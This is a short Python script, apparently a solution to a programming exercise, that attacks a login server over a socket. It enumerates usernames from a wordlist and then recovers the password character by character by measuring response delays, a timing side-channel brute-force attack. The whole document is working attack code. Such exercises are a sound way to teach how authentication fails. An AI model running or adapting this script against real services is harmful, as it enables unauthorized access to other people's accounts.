# write your code here
import sys
import socket
import itertools
import pathlib
import json
import string
from datetime import datetime

ip = sys.argv[1]
port = int(sys.argv[2])
sock = socket.socket()
sock.connect((ip, port))

file = open(str(pathlib.Path(__file__).parent.absolute()) + "/logins.txt")
for login in file:
    login = login.rstrip()
    logopass = json.dumps({'login': login, 'password': '_'})
    sock.send(logopass.encode())
    resp = sock.recv(128)
    res = json.loads(resp.decode())
    if res['result'] == 'Wrong password!':
        break

password = ''
is_found = False
alphabet = string.ascii_letters + string.digits

while not is_found:
    for i in alphabet:
        password += i
        logopass = json.dumps({'login': login, 'password': password})
        sock.send(logopass.encode())
        s = datetime.now()
        resp = sock.recv(128)
        f = datetime.now()
        tmp = resp.decode()
        try:
            res = json.loads(tmp)
        except:
            print(password)
            print(res)
            is_found = True
            break

        if res['result'] == "Connection success!":
            is_found = True
            break
        else:
            if (f - s).microseconds > 1000:
                continue
        password = password[:-1]

print(logopass)
sock.close()
